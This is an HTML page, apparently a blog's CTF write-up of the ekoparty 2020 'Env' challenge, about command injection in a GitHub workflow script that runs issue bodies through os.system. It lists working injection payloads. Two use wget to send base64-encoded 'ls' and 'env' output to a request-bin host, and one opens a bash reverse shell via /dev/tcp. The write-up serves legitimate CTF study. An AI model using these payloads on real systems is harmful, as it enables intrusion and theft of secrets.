@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Env - lmkalg's blog</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Challenge Data", url: "#_top", children: [
+          ]},
+          {title: "Solution", url: "#solution", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/require.js"></script>
+      <script src="../../../search/search.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../head/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../head/" class="btn btn-xs btn-link">
+        Head
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../docs/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../docs/" class="btn btn-xs btn-link">
+        Docs
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="challenge-data">Challenge Data</h1>
+<ul>
+<li><strong>Name</strong>: Env</li>
+<li><strong>Category</strong>: Git</li>
+<li><strong>Points</strong>: 443/500</li>
+</ul>
+<h1 id="solution">Solution</h1>
+<p>(continuation of challenge DOCS)</p>
+<p>Unfortunately, by the time I’m writing this writeup, both repositories were not longer available. </p>
+<p>We had a new repository to inspect. I tried first to inspect the different commits but there was only one. 
+Again, the directory <strong>.github</strong> with some workflows on it was present. 
+This time the files were named <strong>issue-notify.(yaml|py)</strong>.</p>
+<p>The <strong>.yaml</strong> file had nothing interesting, but the Python script did: </p>
+<pre><code class="python">def issue_notify(title, body, repo):
+    # just echo the body into the report repo at /tmp and our scraper script will pick them up and mail them out to staff@
+    notify_id = str(uuid.uuid4())
+    # only notify on very important issues to reduce spam!
+    if 'very important' in title:
+        os.system('echo &quot;%s&quot; &gt; /tmp/%s' % (body, notify_id))
+    return
+
+def run():
+    issue_notify(getenv('ISSUE_TITLE'), getenv('ISSUE_BODY'), Github(getenv('REPORT_TOKEN')))
+    return
+</code></pre>
+
+<p>Each time a new issue (bounced from the public repo) arrived, the <strong>run()</strong> function was executed. 
+As you can see there is clear Code Injection in the <strong>issue_notify</strong> function. The command executed inside <strong>os.sytem</strong> takes into account <strong>body</strong> variable which is filled with the content of the body of the issue submitted. Furthermore, in order to exceute that line, the tilte of the issue should be the string "very important". </p>
+<p>I went to http:/github.com/ekoparty2020/ekolabs and started submitting issues with: 
+<em> <strong>Title</strong>: very important
+</em> <strong>Body</strong>: asd" ; #COMMAND_TO_EXECUTE; echo "asd</p>
+<p>I used <a href="https://pipedream.com/">Pipedream</a> in order to check if was receiving any kind of connection from the server. These were my attempts:</p>
+<ol>
+<li>
+<p>Ensure it was working: 
+    <code>body --&gt; asd" ; wget https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net; echo "asd</code>
+    The GET arrived!!</p>
+</li>
+<li>
+<p>Execute an 'ls'
+    <code>body --&gt;  asd"; wget -X POST https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net --post-data=`echo \`ls\` | base64`; echo "asd</code>
+    The Data arrived! But the information wasn't useful</p>
+</li>
+<li>
+<p>Execute an "env"
+    Because of the name of the challenge, I thought that the flag could be inside the environmental variables. 
+    <code>body --&gt;  asd"; wget -X POST https://b9d850e1b49fcdfa12f3c7eb20d3c3e8.m.pipedream.net --post-data=`echo \`env\` | base64`; echo "asd</code>
+    The data arrived but was just one value. I didn't realise at this point what was happening (I'll come back later to this). </p>
+</li>
+<li>
+<p>Execute a rev shell
+    <code>body --&gt;  asd"; bash -c "/bin/bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/56894 0&gt;&amp;1"; echo "asd</code>
+    This worked. Once inside just executed the 'env' command and the flag was there!</p>
+</li>
+</ol>
+<p>I didn't want to execute a reverse shell because I was sure that the <strong>env</strong> command should've worked. Later I realized, that it didn't work beacuse the output was multiline. Most probably, If I should've issued use a <strong>tr -d '\n'</strong> before encoding it to base64, it could've worked.</p>
+
+  <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
